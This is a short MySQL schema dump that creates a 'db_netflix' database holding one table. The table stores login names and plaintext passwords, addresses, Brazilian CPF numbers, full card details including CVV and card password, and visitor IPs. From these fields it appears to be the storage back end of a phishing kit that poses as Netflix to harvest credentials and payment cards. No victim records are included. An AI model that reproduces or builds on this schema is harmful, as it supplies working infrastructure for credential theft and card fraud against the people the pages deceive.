/*
SQLyog Community v13.1.6 (64 bit)
MySQL - 10.4.17-MariaDB : Database - db_netflix
*********************************************************************
*/

/*!40101 SET NAMES utf8 */;

/*!40101 SET SQL_MODE=''*/;

/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;
CREATE DATABASE /*!32312 IF NOT EXISTS*/`db_netflix` /*!40100 DEFAULT CHARACTER SET utf8mb4 */;

USE `db_netflix`;

/*Table structure for table `tbl_access_info` */

DROP TABLE IF EXISTS `tbl_access_info`;

CREATE TABLE `tbl_access_info` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `UserName` varchar(100) DEFAULT NULL,
  `UserPassword` varchar(100) DEFAULT NULL,
  `Full_Address` varchar(255) DEFAULT NULL,
  `City` varchar(100) DEFAULT NULL,
  `State` varchar(100) DEFAULT NULL,
  `ZipCode` varchar(100) DEFAULT NULL,
  `FullName` varchar(100) DEFAULT NULL,
  `Card_Bin` varchar(100) DEFAULT NULL,
  `CPF` varchar(100) DEFAULT NULL,
  `Expire_date` varchar(100) DEFAULT NULL,
  `CVV` varchar(100) DEFAULT NULL,
  `Card_Schema` varchar(100) DEFAULT NULL,
  `Card_Type` varchar(100) DEFAULT NULL,
  `Card_Brand` varchar(100) DEFAULT NULL,
  `Card_Country` varchar(100) DEFAULT NULL,
  `Card_Bank` varchar(100) DEFAULT NULL,
  `Card_Password` varchar(100) DEFAULT NULL,
  `Access_date` varchar(100) DEFAULT NULL,
  `Is_Visited` varchar(100) DEFAULT NULL,
  `Access_IP` varchar(100) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;
